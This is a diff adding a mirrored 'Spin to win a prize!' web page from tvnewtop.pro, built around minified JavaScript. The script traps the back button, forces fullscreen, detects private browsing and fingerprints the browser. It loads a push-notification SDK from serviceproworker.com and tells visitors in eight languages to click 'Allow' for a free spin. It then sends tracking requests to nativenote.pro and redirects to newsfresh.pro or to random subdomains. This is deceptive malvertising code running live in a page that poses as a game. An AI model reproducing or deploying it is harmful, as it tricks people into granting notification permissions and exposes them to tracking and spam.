@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html>
+<!-- Mirrored from tvnewtop.pro/sweep?h=waWQiOjEwMDA4NjQsInNpZCI6MTAwNTUyMSwid2lkIjo3NzAxLCJzcmMiOjJ9eyJ&bbr=1&si1=&si2= by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 06 Mar 2019 14:51:56 GMT -->
+<!-- Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+
+<head>
+    <meta charset="UTF-8">
+    <title>Sweep</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,height=device-height,initial-scale=1,minimum-scale=1">
+    <link rel="icon" type="image/png" sizes="16x16" href="icon.png">
+    <style>
+        body,
+        html {
+            background-color: #fff;
+            height: 100%
+        }
+
+        body {
+            -moz-osx-font-smoothing: grayscale;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            -webkit-font-smoothing: antialiased;
+            -webkit-user-select: none;
+            font: 400 16px Roboto, Arial, sans-serif;
+            margin: 0;
+            overflow: hidden;
+            text-align: center;
+            user-select: none
+        }
+
+        .fix,
+        body {
+            width: 100%
+        }
+
+        .fix {
+            height: 100%;
+            left: 0;
+            position: fixed;
+            top: 0;
+            z-index: 1
+        }
+
+        .isHide {
+            display: none !important
+        }
+
+        .isShow {
+            display: block !important
+        }
+
+        .cnt {
+            background: url(images/sweep/bg.jpg) no-repeat;
+            background-size: cover;
+            position: relative
+        }
+
+        .cnt,
+        .cnt:before {
+            height: 100%;
+            width: 100%
+        }
+
+        .cnt:before {
+            background-color: hsla(0, 0%, 100%, .2);
+            content: "";
+            top: 0
+        }
+
+        .cnt:before,
+        .cnt__msg {
+            left: 0;
+            position: absolute
+        }
+
+        .cnt__msg {
+            -webkit-animation: a 1.5s ease-in-out infinite alternate;
+            animation: a 1.5s ease-in-out infinite alternate;
+            background-color: #fff;
+            border-radius: 10px;
+            bottom: 30px;
+            box-shadow: 0 5px 10px rgba(0, 0, 0, .5);
+            margin: auto;
+            max-width: 230px;
+            padding: 12px 10px 10px;
+            right: 0
+        }
+
+        .cnt__msg span {
+            color: #197aec
+        }
+
+        .wSpin {
+            position: absolute;
+            top: 10px;
+            width: 100%
+        }
+
+        .wSpin__t {
+            font-size: 24px;
+            font-weight: 700;
+            text-transform: uppercase
+        }
+
+        .wSpin__inner {
+            height: 300px;
+            margin: 5px auto 0;
+            position: relative;
+            width: 300px
+        }
+
+        .wSpin__bg,
+        .wSpin__cursor,
+        .wSpin__smile {
+            border-radius: 50%;
+            bottom: 0;
+            left: 0;
+            position: absolute;
+            right: 0;
+            top: 0
+        }
+
+        .wSpin__smile {
+            background: url(images/sweep/smile.png) no-repeat;
+            background-size: 100%;
+            height: 24%;
+            margin: auto;
+            width: 24%
+        }
+
+        .wSpin__bg {
+            -webkit-animation: b 2s linear infinite;
+            animation: b 2s linear infinite;
+            background: url(images/sweep/spin.png) no-repeat;
+            background-size: 100%;
+            border: 5px solid #eadfd1;
+            box-shadow: 0 0 10px rgba(0, 0, 0, .5)
+        }
+
+        .wSpin__cursor {
+            -webkit-animation: c 4s linear infinite;
+            animation: c 4s linear infinite;
+            overflow: hidden;
+            position: absolute
+        }
+
+        .wSpin__cursor:before {
+            background-color: #eadfd1;
+            box-shadow: -2px -2px 10px 2px rgba(0, 0, 0, .5);
+            content: "";
+            height: 25px;
+            position: absolute;
+            transform: rotate(45deg) translateX(-17px);
+            width: 25px
+        }
+
+        .msgReady {
+            background-color: rgba(0, 0, 0, .75);
+            color: #fff;
+            height: 100%;
+            left: 0;
+            position: fixed;
+            top: 0;
+            width: 100%
+        }
+
+        .msgReady__tx {
+            font-size: 32px;
+            margin-top: 10%
+        }
+
+        @-webkit-keyframes a {
+            0% {
+                transform: translateY(0)
+            }
+
+            to {
+                transform: translateY(10px)
+            }
+        }
+
+        @keyframes a {
+            0% {
+                transform: translateY(0)
+            }
+
+            to {
+                transform: translateY(10px)
+            }
+        }
+
+        @-webkit-keyframes b {
+            0% {
+                transform: rotate(0)
+            }
+
+            to {
+                transform: rotate(1turn)
+            }
+        }
+
+        @keyframes b {
+            0% {
+                transform: rotate(0)
+            }
+
+            to {
+                transform: rotate(1turn)
+            }
+        }
+
+        @-webkit-keyframes c {
+            0% {
+                transform: rotate(0)
+            }
+
+            to {
+                transform: rotate(-1turn)
+            }
+        }
+
+        @keyframes c {
+            0% {
+                transform: rotate(0)
+            }
+
+            to {
+                transform: rotate(-1turn)
+            }
+        }
+
+        @media (min-width:425px) {
+            .msgReady__tx {
+                font-size: 52px
+            }
+        }
+
+        @media (min-width:700px) {
+            .cnt__msg {
+                bottom: auto;
+                left: 50px;
+                right: auto;
+                top: 150px
+            }
+
+            .isYandex .cnt__msg {
+                left: auto;
+                right: 100px;
+                top: 220px
+            }
+
+            .wSpin {
+                bottom: 10px;
+                right: 0;
+                top: auto;
+                width: 430px
+            }
+
+            .isYandex .wSpin {
+                left: 0;
+                right: auto;
+                width: 330px
+            }
+        }
+
+        @media (min-width:1024px) {
+            .cnt__msg {
+                left: 150px
+            }
+
+            .isYandex .wSpin,
+            .wSpin {
+                bottom: auto;
+                left: 0;
+                margin: auto;
+                right: 0;
+                top: 50%;
+                transform: translateY(-50%);
+                width: 500px
+            }
+
+            .wSpin__inner {
+                height: 450px;
+                width: 450px
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="cnt">
+        <div class="cnt__msg"></div>
+        <div class="wSpin">
+            <div class="wSpin__t"></div>
+            <div class="wSpin__inner">
+                <div class="wSpin__smile"></div>
+                <div class="wSpin__bg"></div>
+                <div class="wSpin__cursor"></div>
+            </div>
+        </div>
+    </div>
+    <div class="msgReady isHide">
+        <div class="msgReady__tx"></div>
+    </div>
+    <div class="fix"></div>
+    <script>
+        ! function(t) {
+            var i = {};
+
+            function r(e) {
+                if (i[e]) return i[e].exports;
+                var n = i[e] = {
+                    i: e,
+                    l: !1,
+                    exports: {}
+                };
+                return t[e].call(n.exports, n, n.exports, r), n.l = !0, n.exports
+            }
+            r.m = t, r.c = i, r.d = function(e, n, t) {
+                r.o(e, n) || Object.defineProperty(e, n, {
+                    enumerable: !0,
+                    get: t
+                })
+            }, r.r = function(e) {
+                "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
+                    value: "Module"
+                }), Object.defineProperty(e, "__esModule", {
+                    value: !0
+                })
+            }, r.t = function(n, e) {
+                if (1 & e && (n = r(n)), 8 & e) return n;
+                if (4 & e && "object" == typeof n && n && n.__esModule) return n;
+                var t = Object.create(null);
+                if (r.r(t), Object.defineProperty(t, "default", {
+                        enumerable: !0,
+                        value: n
+                    }), 2 & e && "string" != typeof n)
+                    for (var i in n) r.d(t, i, function(e) {
+                        return n[e]
+                    }.bind(null, i));
+                return t
+            }, r.n = function(e) {
+                var n = e && e.__esModule ? function() {
+                    return e.default
+                } : function() {
+                    return e
+                };
+                return r.d(n, "a", n), n
+            }, r.o = function(e, n) {
+                return Object.prototype.hasOwnProperty.call(e, n)
+            }, r.p = "", r(r.s = 2)
+        }([function(e, n) {
+            if (0 === "".length) {
+                var t = function() {
+                    void 0 !== this.requestFullScreen ? this.requestFullScreen() : void 0 !== this.webkitRequestFullScreen ? this.webkitRequestFullScreen() : void 0 !== this.mozRequestFullScreen && this.mozRequestFullScreen()
+                };
+                document.body.addEventListener("keydown", t), document.body.addEventListener("click", t)
+            }
+        }, , function(e, n, t) {
+            "use strict";
+            t.r(n);
+            var u = function() {
+                    var e = location.search.split("#")[0].split("?")[1];
+                    if (void 0 === e) return null;
+                    var i = {};
+                    return e.split("&").forEach(function(e) {
+                        var n = e.split("=");
+                        if (2 === n.length) i[n[0]] = n[1] || null;
+                        else {
+                            var t = n[0];
+                            n.shift(), i[t] = n.join("=")
+                        }
+                    }), i
+                },
+                i = u();
+            if (null !== i && void 0 !== i.bbr && "1" === i.bbr) {
+                var r = document.title,
+                    o = location.pathname + location.search;
+                history.pushState(null, r, o), window.addEventListener("popstate", function() {
+                    history.pushState({}, r, o)
+                })
+            }
+            t(0);
+            var a = function(n) {
+                    var e = decodeURIComponent(document.cookie).split(";");
+                    if (0 === e.length) return null;
+                    var t = null;
+                    return e.some(function(e) {
+                        if (" " === e[0] && (e = e.slice(1)), e = e.split("="), n === e[0]) return t = e[1], !0
+                    }), t
+                },
+                l = function(e, n, t, i) {
+                    var r = new Date;
+                    r.setTime(r.getTime() + 1e3 * t);
+                    var o = "; expires=" + r.toUTCString(),
+                        a = "";
+                    void 0 !== i && (a = "; domain=" + i), document.cookie = e + "=" + (n || "") + a + o + "; path=/"
+                },
+                c = function(e, n) {
+                    var t = new XMLHttpRequest;
+                    t.addEventListener("readystatechange", function() {
+                        if (2 === this.readyState && void 0 !== n) return n()
+                    }), t.addEventListener("error", function() {
+                        if (void 0 !== n) return n()
+                    }), t.open("GET.html", e, !0), t.responseType = "text", t.send()
+                },
+                s = function(e, n, t) {
+                    null == n && (n = "tracking");
+                    var i = 0;
+                    "tb" === e ? i = 7 : "private" === e && (i = 12);
+                    var r, o, a = u();
+                    null === a && (a = {}), r = void 0 === a.si1 || null === a.si1 ? "" : a.si1, o = void 0 === a.si2 || null === a.si2 ? "" : a.si2, r = r.slice(0, 32), o = o.slice(0, 32);
+                    var s = "https://nativenote.pro/rpe?" + ["a=1", "s=1", "act=" + i, "src=2", "p=1000864", "st=1005521", "wd=7701", "d=tvnewtop.pro", "tpl=17", "rnd=" + Math.random(), "sbid=" + encodeURIComponent(r), "sbid2=" + encodeURIComponent(o)].join("&");
+                    c(s, function() {
+                        if (l(n, "1", 86400, "tvnewtop.pro"), void 0 !== t) return t()
+                    })
+                },
+                d = function(e) {
+                    null !== window.opener && void 0 !== window.opener && opener.postMessage(e, "*")
+                },
+                f = function(e, n) {
+                    var t = "https://newsfresh.pro/tb?h=waWQiOjEwMDA4NjQsInNpZCI6MTAwNTUyMSwid2lkIjo3NzAxLCJzcmMiOjJ9eyJ&amp;bbr=1&amp;si1=&amp;si2=";
+                    if (0 !== t.length) s("tb", null, function() {
+                        d({
+                            a: n ? "success" : "close"
+                        }), location.href = t
+                    });
+                    else if (void 0 !== e) return e(n)
+                },
+                p = {
+                    ua: navigator.userAgent,
+                    m: function(n) {
+                        var e = "normal",
+                            t = "private";
+
+                        function i() {
+                            return n(t)
+                        }
+
+                        function r() {
+                            return n(e)
+                        }
+                        if ("safari" === p.n) try {
+                            return window.openDatabase(null, null, null, null), n(e)
+                        } catch (e) {
+                            return n(t)
+                        } else if ("firefox" === p.n) {
+                            var o = indexedDB.open("test");
+                            o.addEventListener("error", i), o.addEventListener("success", r)
+                        } else {
+                            if ("edge" === p.n) return void 0 !== window.indexedDB || void 0 === window.PointerEvent && void 0 === window.MSPointerEvent ? n(e) : n(t);
+                            if ("opera" !== p.n && "yandex" !== p.n && "chrome" !== p.n) return n("unknown");
+                            window.webkitRequestFileSystem(window.TEMPORARY, 1, r, i)
+                        }
+                    },
+                    get n() {
+                        var e = !!window.opr && !!opr.addons || !!window.opera || 0 < this.ua.indexOf("OPR/index.html"),
+                            n = "undefined" != typeof InstallTrigger,
+                            t = /constructor/i.test(window.HTMLElement) || /(MacPPC|MacIntel|Mac_PowerPC|Macintosh)/.test(this.ua),
+                            i = !!window.chrome && /Google Inc/.test(navigator.vendor),
+                            r = 0 < this.ua.indexOf("YaBrowser") || 0 < this.ua.indexOf("Yowser"),
+                            o = /UBrowser/.test(this.ua),
+                            a = /Edge\//.test(this.ua),
+                            s = null;
+                        return e ? s = "opera" : n ? s = "firefox" : r ? s = "yandex" : o ? s = "uc" : a ? s = "edge" : i ? s = "chrome" : t && (s = "safari"), s
+                    },
+                    get d() {
+                        var n = {
+                                webOS: "webOS",
+                                iPhone: "iPhone",
+                                iPad: "iPad",
+                                iPod: "iPod",
+                                mac: "(MacPPC|MacIntel|Mac_PowerPC|Macintosh)",
+                                blackBerry: "BlackBerry|BB|PlayBook",
+                                windows: "Windows NT",
+                                windowPhone: "Windows Phone",
+                                android: "Android"
+                            },
+                            t = null;
+                        return Object.keys(n).some(function(e) {
+                            if (null !== p.ua.match(new RegExp(n[e], "i"))) return t = e, !0
+                        }), t
+                    }
+                },
+                v = p,
+                g = u(),
+                w = {
+                    c: 0,
+                    s: !0,
+                    r: parseInt("0", 10),
+                    next: function() {
+                        var e, n = "?",
+                            r = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "x", "y", "z", "1", "2", "3", "4", "5", "6", "7", "8", "9"];
+                        r.forEach(function(e, n) {
+                            var t = Math.floor(Math.random() * (n + 1)),
+                                i = [r[t], r[n]];
+                            r[n] = i[0], r[t] = i[1]
+                        }), e = r.slice(0, 5).join(""), w.c++, null === g ? g = {
+                            i: w.c
+                        } : g.i = w.c, Object.keys(g).forEach(function(e) {
+                            null !== g[e] && (n += e + "=" + g[e] + "&")
+                        }), n = n.slice(0, -1), d({
+                            a: "next",
+                            c: w.c
+                        }), location.href = "https://" + e + ".tvnewtop.pro/sweep" + n
+                    },
+                    get can() {
+                        return this.s
+                    }
+                };
+            null !== g && void 0 !== g.i && (w.c = parseInt(g.i, 10)), 0 < w.r && (w.s = w.c < w.r);
+            var m = w,
+                h = function(n) {
+                    if (!(void 0 !== window.navigator && void 0 !== navigator.serviceWorker && void 0 !== window.PushManager && void 0 !== window.Notification)) return n(!1, "unsupported");
+                    v.m(function(e) {
+                        return "private" === e ? n(!1, e) : "unknown" === e ? n(!1, e) : n(!0, "supported")
+                    })
+                },
+                y = {
+                    k: "",
+                    t: {},
+                    set: function(e) {
+                        void 0 !== window.navigator && void 0 !== navigator.language && (y.k = navigator.language.slice(0, 2)), void 0 === e[y.k] && (y.k = "en"), y.t = e[y.k]
+                    },
+                    get: function(e) {
+                        return y.t[e]
+                    }
+                },
+                b = y;
+
+            function S(e) {
+                d({
+                    a: e ? "success" : "close"
+                }), null !== window.opener && void 0 !== window.opener && close(), document.querySelector(".cnt").classList.add("isHide"), document.querySelector(".msgReady").classList.remove("isHide")
+            }
+            var P = "convert";
+            if (m.can)
+                if ("firefox" === v.n && 2 === location.hostname.split(".").length) m.next();
+                else if (null !== a(P)) f(S, 1);
+            else {
+                var R = function() {
+                    window.edPushSDK.push(arguments)
+                };
+                window.edPushSDK = window.edPushSDK || [], R("onGranted", function() {
+                    l(P, "1", 604800, "tvnewtop.pro");
+                    var e = "";
+                    0 !== e.length ? c(e, function() {
+                        f(S, 1)
+                    }) : f(S, 1)
+                }), R("onDenied", function() {
+                    h(function(e) {
+                        e && m.next()
+                    })
+                }), R("onClose", function() {
+                    location.reload()
+                }), R("onSubscribed", function() {
+                    f(S, 1)
+                }), R("onError", function(e) {
+                    console.log(e)
+                });
+                var O = document.createElement("script");
+                O.async = !0, O.src = "https://serviceproworker.com/v1/sdk.js?h=waWQiOjEwMDA4NjQsInNpZCI6MTAwNTUyMSwid2lkIjo3NzAxLCJzcmMiOjJ9eyJ&amp;d=tvnewtop.pro&amp;tpl=17", document.head.appendChild(O), h(function(e, n) {
+                    e || ("private" === n ? s(n, null, f(S)) : f(S))
+                })
+            } else f(S);
+            b.set({
+                en: {
+                    msg: "Click <span>Allow</span>, to get free spin",
+                    title: "Spin to win a prize!",
+                    msgReady: "You have successfully passed the verification!<br>Now you can close the window."
+                },
+                uk: {
+                    msg: "Натисніть <span>Дозволити</span>, щоб отримати безкоштовний обертання",
+                    title: "Спин, щоб виграти приз!",
+                    msgReady: "Ви успішно пройшли перевірку!<br>Тепер ви можете закрити вікно."
+                },
+                pl: {
+                    msg: "Kliknij <span>Pozwól</span>, aby uzyskać darmowy spin",
+                    title: "Zakręć, aby wygrać nagrodę!",
+                    msgReady: "Pomyślnie przeszedłeś weryfikację!<br>Teraz możesz zamknąć okno."
+                },
+                ru: {
+                    msg: "Нажмите <span>Разрешить</span>, чтобы получить свободное вращение",
+                    title: "Спин, чтобы выиграть приз!",
+                    msgReady: "Вы успешно прошли проверку!<br>Теперь вы можете закрыть окно ..."
+                },
+                fr: {
+                    msg: "Cliquez sur <span>Autoriser</span> pour obtenir un tour gratuit",
+                    title: "Tourner pour gagner un prix!",
+                    msgReady: "Vous avez réussi le test!<br>Maintenant vous pouvez fermer la fenêtre"
+                },
+                de: {
+                    msg: "Klicken Sie auf <span>Allow</span>, um eine freie Drehung zu erhalten",
+                    title: "Spin, um einen Preis zu gewinnen!",
+                    msgReady: "Sie haben den Test erfolgreich bestanden!<br>Jetzt können Sie das Fenster schließen"
+                },
+                es: {
+                    msg: "Haga clic en <span>Permitir</span> para obtener giros gratis",
+                    title: "¡Gira para ganar un premio!",
+                    msgReady: "Has pasado la prueba con éxito!<br>Ahora puedes cerrar la ventana"
+                },
+                th: {
+                    msg: "คลิก <span>อนุญาต</span> เพื่อรับปั่นฟรี",
+                    title: "สปินลุ้นรับรางวัล!",
+                    msgReady: "คุณผ่านการตรวจสอบสำเร็จแล้ว!<br>ตอนนี้คุณสามารถปิดหน้าต่างได้"
+                }
+            }), "yandex" === v.n && document.body.classList.add("isYandex"), document.querySelector(".cnt__msg").innerHTML = b.get("msg"), document.querySelector(".wSpin__t").textContent = b.get("title"), document.querySelector(".msgReady__tx").innerHTML = b.get("msgReady")
+        }]);
+    </script>
+</body>
+<!-- Mirrored from tvnewtop.pro/sweep?h=waWQiOjEwMDA4NjQsInNpZCI6MTAwNTUyMSwid2lkIjo3NzAxLCJzcmMiOjJ9eyJ&bbr=1&si1=&si2= by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 06 Mar 2019 14:52:02 GMT -->
+
+</html>
